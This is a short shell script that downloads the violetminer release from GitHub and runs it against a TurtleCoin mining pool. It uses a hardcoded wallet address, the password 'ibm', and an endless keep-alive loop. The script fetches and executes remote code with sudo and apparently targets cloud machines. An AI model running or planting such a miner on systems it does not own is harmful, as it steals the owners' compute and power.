#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
tar xf violetminer-linux-v0.2.2.tar.gz; cd violetminer-linux-v0.2.2 && ./violetminer --pool turtlecoin.herominers.com:10381 --username TRTLux8bT9jjEUCJYUs6w3L35vhAHp7445zDxC2X34D2KEVAHCjbLbAX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhMtFpPt --password ibm --algorithm turtlecoin
while [ 1 ]; do
sleep 3
done
sleep 999
